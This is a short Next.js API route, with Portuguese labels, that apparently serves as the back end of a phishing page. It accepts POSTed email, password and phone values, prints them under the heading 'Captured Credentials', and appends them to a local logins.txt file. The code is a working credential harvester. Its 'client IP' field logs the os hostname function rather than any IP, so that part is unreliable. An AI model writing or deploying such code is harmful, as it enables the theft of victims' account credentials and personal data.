// Next.js API route support: https://nextjs.org/docs/api-routes/introduction
import fs from "fs/promises"
import { hostname } from "os"
export default async function handler(req, res) {
  const { method } = req

  if (method !== 'POST') {
    res.status(405).json({ message: 'Method not allowed' })
    return
  }

  const { email, password, telefone} = req.body

  const message = `🥃 Credenciais Capturadas 🥃`

  console.log(message)
  console.log(`Email: ${email}`)
  console.log(`Password: ${password}`)
  console.log(`Horário: ${new Date()}`)
  console.log(`client IP: ${hostname}`)
  console.log(`Telefone: ${telefone}`)



  await fs.appendFile(
    "C:/Users/nexuusz/Desktop/Projetão/logins/logins.txt",
    `Email: ${email}\nTelefone: ${telefone}\nSenha:${password}\nData:${new Date()}\nDispositivo:${hostname}\n\n`
  )

  res.status(200).json({ message: 'ok' })
}